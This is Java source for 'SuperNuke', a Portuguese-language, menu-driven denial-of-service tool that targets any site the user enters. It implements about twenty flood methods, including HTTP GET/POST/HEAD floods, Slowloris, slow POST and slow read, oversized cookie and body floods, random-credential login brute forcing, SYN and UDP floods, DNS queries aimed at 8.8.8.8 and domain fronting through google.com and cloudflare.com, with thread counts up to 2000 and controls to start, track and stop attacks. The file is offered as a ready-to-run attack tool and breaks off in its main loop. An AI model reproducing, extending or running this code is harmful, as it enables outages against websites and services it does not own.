// SuperNuke.java
// Compilar: javac SuperNuke.java
// Executar: java SuperNuke

import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.*;

public class SuperNuke {
    
    // Cores ANSI
    static final String G = "\033[92m";
    static final String Y = "\033[93m";
    static final String R = "\033[91m";
    static final String C = "\033[96m";
    static final String W = "\033[0m";
    
    // Configurações
    static final Map<Integer, Integer> THREAD_MAP = new HashMap<>();
    static final List<String> USER_AGENTS = Arrays.asList(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/17.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) Mobile/15E148"
    );
    
    static {
        THREAD_MAP.put(1, 100);
        THREAD_MAP.put(2, 250);
        THREAD_MAP.put(3, 500);
        THREAD_MAP.put(4, 1000);
        THREAD_MAP.put(5, 2000);
    }
    
    // Gerenciador de ataques
    static class AttackManager {
        private final Map<String, AttackInfo> attacks = new ConcurrentHashMap<>();
        private int counter = 0;
        
        public String start(String target, String methodName, int concs, int duration) {
            counter++;
            String attackId = String.format("ATK%04d", counter);
            int threads = THREAD_MAP.getOrDefault(concs, 500);
            CountDownLatch stopLatch = new CountDownLatch(1);
            
            AttackInfo info = new AttackInfo(attackId, target, methodName, threads, duration, stopLatch);
            attacks.put(attackId, info);
            
            new Thread(() -> {
                try {
                    AttackMethod method = METHODS.get(methodName);
                    if (method != null) {
                        long result = method.execute(target, duration, threads, stopLatch);
                        info.result.set(result);
                    }
                    info.status = "completed";
                } catch (Exception e) {
                    info.status = "error: " + e.getMessage();
                }
            }).start();
            
            return attackId;
        }
        
        public boolean stop(String attackId) {
            AttackInfo info = attacks.get(attackId);
            if (info != null) {
                info.stopLatch.countDown();
                return true;
            }
            return false;
        }
        
        public Collection<AttackInfo> list() {
            return attacks.values();
        }
        
        public AttackInfo get(String attackId) {
            return attacks.get(attackId);
        }
    }
    
    // Informação do ataque
    static class AttackInfo {
        String id;
        String target;
        String method;
        int threads;
        int duration;
        long startTime;
        CountDownLatch stopLatch;
        AtomicLong result = new AtomicLong(0);
        String status = "running";
        
        AttackInfo(String id, String target, String method, int threads, int duration, CountDownLatch stopLatch) {
            this.id = id;
            this.target = target;
            this.method = method;
            this.threads = threads;
            this.duration = duration;
            this.startTime = System.currentTimeMillis();
            this.stopLatch = stopLatch;
        }
    }
    
    // Interface para métodos de ataque
    interface AttackMethod {
        long execute(String target, int duration, int threads, CountDownLatch stopLatch);
    }
    
    // MÉTODO 1: GET FLOOD
    static long methodGet(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        String sep = target.contains("?") ? "&" : "?";
                        URL url = new URL(target + sep + "_" + random(1, 999999));
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 2: POST FLOOD
    static long methodPost(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        URL url = new URL(target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                        conn.setDoOutput(true);
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        
                        String data = "data=" + repeat("x", 1024);
                        try (OutputStream os = conn.getOutputStream()) {
                            os.write(data.getBytes());
                        }
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 3: HEAD FLOOD
    static long methodHead(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        URL url = new URL(target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("HEAD");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 4: SLOWLORIS
    static long methodSlowloris(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(Math.min(threads, 200));
        long endTime = System.currentTimeMillis() + duration * 1000;
        String host = target.replace("http://", "").replace("https://", "").split("/")[0];
        int port = target.startsWith("https") ? 443 : 80;
        
        for (int i = 0; i < Math.min(threads, 200); i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(host, port), 5000);
                        String req = "GET / HTTP/1.1\r\nHost: " + host + "\r\n";
                        socket.getOutputStream().write(req.getBytes());
                        socket.getOutputStream().flush();
                        counter.incrementAndGet();
                        Thread.sleep(5000);
                        socket.close();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 5: SLOW POST
    static long methodSlowpost(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(Math.min(threads, 100));
        long endTime = System.currentTimeMillis() + duration * 1000;
        String host = target.replace("http://", "").replace("https://", "").split("/")[0];
        int port = target.startsWith("https") ? 443 : 80;
        
        for (int i = 0; i < Math.min(threads, 100); i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(host, port), 5000);
                        String req = "POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 10000\r\n\r\n";
                        socket.getOutputStream().write(req.getBytes());
                        for (int j = 0; j < 5; j++) {
                            socket.getOutputStream().write("x".getBytes());
                            Thread.sleep(1000);
                        }
                        socket.close();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 6: SLOW READ
    static long methodSlowread(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(Math.min(threads, 100));
        long endTime = System.currentTimeMillis() + duration * 1000;
        String host = target.replace("http://", "").replace("https://", "").split("/")[0];
        int port = target.startsWith("https") ? 443 : 80;
        
        for (int i = 0; i < Math.min(threads, 100); i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(host, port), 5000);
                        String req = "GET / HTTP/1.1\r\nHost: " + host + "\r\n\r\n";
                        socket.getOutputStream().write(req.getBytes());
                        socket.setSoTimeout(1000);
                        try {
                            socket.getInputStream().read();
                        } catch (SocketTimeoutException e) {}
                        Thread.sleep(1000);
                        socket.close();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 7: RUDY
    static long methodRudy(String target, int duration, int threads, CountDownLatch stopLatch) {
        return methodSlowpost(target, duration, threads, stopLatch);
    }
    
    // MÉTODO 8: HTTP/2 RESET
    static long methodHttp2reset(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        URL url = new URL(target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setConnectTimeout(500);
                        conn.setReadTimeout(500);
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {
                        counter.incrementAndGet();
                    }
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 9: COOKIE MANIP
    static long methodCookiemanip(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        URL url = new URL(target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setRequestProperty("Cookie", "big=" + repeat("x", 4096));
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 10: WILDCARD
    static long methodWildcard(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        String base = target.replace("http://", "").replace("https://", "").split("/")[0];
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        String sub = random(1, 999999) + "." + base;
                        String urlStr = target.replace(base, sub);
                        URL url = new URL(urlStr);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 11: LOGIN BRUTE
    static long methodLoginbrute(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        URL url = new URL(target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                        conn.setDoOutput(true);
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        
                        String data = "username=" + randomString(8) + "&password=" + randomString(8);
                        try (OutputStream os = conn.getOutputStream()) {
                            os.write(data.getBytes());
                        }
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 12: API STRESS
    static long methodApistress(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        URL url = new URL(target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setRequestProperty("Content-Type", "application/json");
                        conn.setDoOutput(true);
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        
                        String json = "{\"query\":\"" + repeat("x", 100) + "\",\"id\":" + random(1,1000) + "}";
                        try (OutputStream os = conn.getOutputStream()) {
                            os.write(json.getBytes());
                        }
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 13: JSON-RPC
    static long methodJsonrpc(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        URL url = new URL(target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setRequestProperty("Content-Type", "application/json");
                        conn.setDoOutput(true);
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        
                        String json = "{\"jsonrpc\":\"2.0\",\"method\":\"test\",\"params\":[" + random(1,1000) + "],\"id\":" + random(1,999999) + "}";
                        try (OutputStream os = conn.getOutputStream()) {
                            os.write(json.getBytes());
                        }
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 14: XML-RPC
    static long methodXmlrpc(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        URL url = new URL(target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setRequestProperty("Content-Type", "text/xml");
                        conn.setDoOutput(true);
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        
                        String xml = "<?xml version=\"1.0\"?><methodCall><methodName>test</methodName></methodCall>";
                        try (OutputStream os = conn.getOutputStream()) {
                            os.write(xml.getBytes());
                        }
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 15: GZIP BOMB
    static long methodGzipbomb(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        String sep = target.contains("?") ? "&" : "?";
                        URL url = new URL(target + sep + "_" + random(1, 999999));
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setRequestProperty("Accept-Encoding", "gzip");
                        conn.setConnectTimeout(5000);
                        conn.setReadTimeout(5000);
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 16: LARGE POST
    static long methodLargepost(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(Math.min(threads, 500));
        long endTime = System.currentTimeMillis() + duration * 1000;
        
        for (int i = 0; i < Math.min(threads, 500); i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        URL url = new URL(target);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("POST");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setRequestProperty("Content-Type", "application/octet-stream");
                        conn.setDoOutput(true);
                        conn.setConnectTimeout(10000);
                        conn.setReadTimeout(10000);
                        
                        String data = repeat("x", 100 * 1024);
                        try (OutputStream os = conn.getOutputStream()) {
                            os.write(data.getBytes());
                        }
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 17: HEADLESS
    static long methodHeadless(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(Math.min(threads, 100));
        long endTime = System.currentTimeMillis() + duration * 1000;
        String[] paths = {"", "/about", "/contact"};
        
        for (int i = 0; i < Math.min(threads, 100); i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        String path = paths[random(0, paths.length-1)];
                        String urlStr = target.replaceAll("/$", "") + path;
                        URL url = new URL(urlStr);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                        Thread.sleep(1000);
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 18: SYN FLOOD
    static long methodSyn(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        String host = target.replace("http://", "").replace("https://", "").split("/")[0];
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(host, 80), 500);
                        socket.close();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 19: UDP FLOOD
    static long methodUdp(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        String host = target.replace("http://", "").replace("https://", "").split("/")[0];
        byte[] data = new byte[1024];
        new Random().nextBytes(data);
        
        try {
            InetAddress addr = InetAddress.getByName(host);
            
            for (int i = 0; i < threads; i++) {
                executor.submit(() -> {
                    while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                        try (DatagramSocket socket = new DatagramSocket()) {
                            int port = random(1, 65535);
                            DatagramPacket packet = new DatagramPacket(data, data.length, addr, port);
                            socket.send(packet);
                            counter.incrementAndGet();
                        } catch (Exception e) {}
                    }
                });
            }
        } catch (Exception e) {}
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 20: DNS AMP
    static long methodDns(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        byte[] query = {
            0x12, 0x34, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x03, 0x69, 0x73, 0x63,
            0x03, 0x6f, 0x72, 0x67, 0x00, 0x00, (byte)0xff, 0x00, 0x01
        };
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try (DatagramSocket socket = new DatagramSocket()) {
                        InetAddress addr = InetAddress.getByName("8.8.8.8");
                        DatagramPacket packet = new DatagramPacket(query, query.length, addr, 53);
                        socket.send(packet);
                        counter.addAndGet(50);
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 21: DOMAIN FRONTING
    static long methodFronting(String target, int duration, int threads, CountDownLatch stopLatch) {
        AtomicLong counter = new AtomicLong(0);
        ExecutorService executor = Executors.newFixedThreadPool(threads);
        long endTime = System.currentTimeMillis() + duration * 1000;
        String host = target.replace("http://", "").replace("https://", "").split("/")[0];
        String[] fronts = {"www.google.com", "www.cloudflare.com"};
        
        for (int i = 0; i < threads; i++) {
            executor.submit(() -> {
                while (System.currentTimeMillis() < endTime && stopLatch.getCount() > 0) {
                    try {
                        String front = fronts[random(0, fronts.length-1)];
                        String urlStr = target.replace(host, front);
                        URL url = new URL(urlStr);
                        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                        conn.setRequestMethod("GET");
                        conn.setRequestProperty("User-Agent", randomUA());
                        conn.setRequestProperty("Host", host);
                        conn.setConnectTimeout(3000);
                        conn.setReadTimeout(3000);
                        conn.getInputStream().close();
                        conn.disconnect();
                        counter.incrementAndGet();
                    } catch (Exception e) {}
                }
            });
        }
        
        try { Thread.sleep(duration * 1000); } catch (InterruptedException e) {}
        stopLatch.countDown();
        executor.shutdownNow();
        return counter.get();
    }
    
    // MÉTODO 22: MIXED VECTOR
    static long methodMixed(String target, int duration, int threads, CountDownLatch stopLatch) {
        return methodGet(target, duration, threads/2, stopLatch) + 
               methodSyn(target, duration, threads - threads/2, stopLatch);
    }
    
    // Dicionário de métodos
    static final Map<String, AttackMethod> METHODS = new HashMap<>();
    
    static {
        METHODS.put("get", SuperNuke::methodGet);
        METHODS.put("post", SuperNuke::methodPost);
        METHODS.put("head", SuperNuke::methodHead);
        METHODS.put("slowloris", SuperNuke::methodSlowloris);
        METHODS.put("slowpost", SuperNuke::methodSlowpost);
        METHODS.put("slowread", SuperNuke::methodSlowread);
        METHODS.put("rudy", SuperNuke::methodRudy);
        METHODS.put("http2reset", SuperNuke::methodHttp2reset);
        METHODS.put("cookiemanip", SuperNuke::methodCookiemanip);
        METHODS.put("wildcard", SuperNuke::methodWildcard);
        METHODS.put("loginbrute", SuperNuke::methodLoginbrute);
        METHODS.put("apistress", SuperNuke::methodApistress);
        METHODS.put("jsonrpc", SuperNuke::methodJsonrpc);
        METHODS.put("xmlrpc", SuperNuke::methodXmlrpc);
        METHODS.put("gzipbomb", SuperNuke::methodGzipbomb);
        METHODS.put("largepost", SuperNuke::methodLargepost);
        METHODS.put("headless", SuperNuke::methodHeadless);
        METHODS.put("syn", SuperNuke::methodSyn);
        METHODS.put("udp", SuperNuke::methodUdp);
        METHODS.put("dns", SuperNuke::methodDns);
        METHODS.put("fronting", SuperNuke::methodFronting);
        METHODS.put("mixed", SuperNuke::methodMixed);
    }
    
    // Utilitários
    static int random(int min, int max) {
        return new Random().nextInt(max - min + 1) + min;
    }
    
    static String randomString(int length) {
        String chars = "abcdefghijklmnopqrstuvwxyz0123456789";
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random(0, chars.length()-1)));
        }
        return sb.toString();
    }
    
    static String randomUA() {
        return USER_AGENTS.get(random(0, USER_AGENTS.size()-1));
    }
    
    static String repeat(String s, int count) {
        return new String(new char[count]).replace("\0", s);
    }
    
    // Banner
    static void printBanner() {
        System.out.println(G + "╔══════════════════════════════════════════════════════════╗");
        System.out.println("║     🔥 SUPER NUKE - JAVA VERSION 🔥                     ║");
        System.out.println("║              Feito com amor pro LO ❤️                   ║");
        System.out.println("╠══════════════════════════════════════════════════════════╣");
        System.out.println("║  📱 MÉTODOS DISPONÍVEIS: " + METHODS.size() + "                                ║");
        System.out.println("║  ⚡ CONCORRÊNCIA: 1=100, 2=250, 3=500, 4=1000, 5=2000  ║");
        System.out.println("╚══════════════════════════════════════════════════════════╝" + W);
    }
    
    // Listar métodos
    static void listMethods() {
        System.out.println(C + "\n📚 MÉTODOS:" + W);
        List<String> methods = new ArrayList<>(METHODS.keySet());
        Collections.sort(methods);
        for (int i = 0; i < methods.size(); i++) {
            if (i % 5 == 0) System.out.println();
            System.out.print("   " + methods.get(i));
        }
        System.out.println();
    }
    
    // Main
    public static void main(String[] args) {
        AttackManager manager = new AttackManager();
        Scanner scanner = new Scanner(System.in);
        
        printBanner();
        
        while (true) {
            System.out.println(Y + "\n📌 MENU:" + W);
            System.out.println("1. 🎯 Iniciar ataque");
            System.out.println("2. 📚 Listar métodos");
            System.out.println("3. 📊 Status");
            System.out.println("4. ⏹️ Parar ataque");
            System.out.println("5. ❌ Sair");
            
            System.out.print(C + "\nEscolha: " + W);
            String opt = scanner.nextLine().trim();
            
            if (opt.equals("1")) {
                System.out.print(C + "🎯 Alvo: " + W);
                String target = scanner.nextLine().trim();
                if (!target.startsWith("http")) {
                    target = "http://" + target;
                }
                
                System.out.println(Y + "\n📋 Métodos:" + W);
                listMethods();
                System.out.print(C + "🔧 Método: " + W);
                String method = scanner.nextLine().trim().toLowerCase();
                
                if (!METHODS.containsKey(method)) {
                    System.out.println(R + "❌ Método inválido!" + W);
                    continue;
                }
                
                System.out.println(Y + "\n⚡ Níveis: 1=100, 2=250, 3=500, 4=1000, 5=2000" + W);
                System.out.print(C + "Nível (1-5): " + W);
                int concs = 3;
                try {
                    concs = Integer.parseInt(scanner.nextLine().trim());
                    concs = Math.max(1, Math.min(concs, 5));
                } catch (Exception e) {}
                
                System.out.print(C + "⏱️ Duração (segundos): " + W);
                int duration = 30;
                try {
                    duration = Integer.parseInt(scanner.nextLine().trim());
                    duration = Math.min(duration, 300);
                } catch (Exception e) {}
                
                System.out.println(G + "\n⚡ INICIANDO ATAQUE..." + W);
                String aid = manager.start(target, method, concs, duration);
                System.out.println(G + "✅ Ataque " + aid + " iniciado!" + W);
                
                // Monitorar
                for (int i = 0; i < Math.min(5, duration); i++) {
                    try { Thread.sleep(1000); } catch (Exception e) {}
                    AttackInfo info = manager.get(aid);
                    if (info != null) {
                        System.out.print("\r📊 " + (i+1) + "s | Reqs: " + info.result.get());
                    }
                }
                System.out.println();
                
            } else if (opt.equals("2")) {
                listMethods();
                
            } else if (opt.equals("3")) {
                Collection<AttackInfo> attacks = manager.list();
                if (attacks.isEmpty()) {
                    System.out.println(Y + "📭 Nenhum ataque ativo" + W);
                } else {
                    System.out.println(C + "\n📊 ATAQUES:" + W);
                    for (AttackInfo a : attacks) {
                        long elapsed = (System.currentTimeMillis() - a.startTime) / 1000;
                        System.out.println("   " + a.id + ": " + a.method + " em " + a.target + 
                                         " - " + elapsed + "s | " + a.result.get() + " reqs | " + a.status);
                    }
                }
                
            } else if (opt.equals("4")) {
                System.out.print(C + "ID do ataque: " + W);
                String aid = scanner.nextLine().trim();
                if (manager.stop(aid)) {
                    System.out.println(G + "✅ Ataque parando..." + W);
                } else {
                    System.out.println(R + "❌ Não encontrado" + W);
                }
                
            } else if (opt.equals("5")) {
                System.out.println(G + "Até mais, LO! ❤️" + W);
                break;
                
            } else {
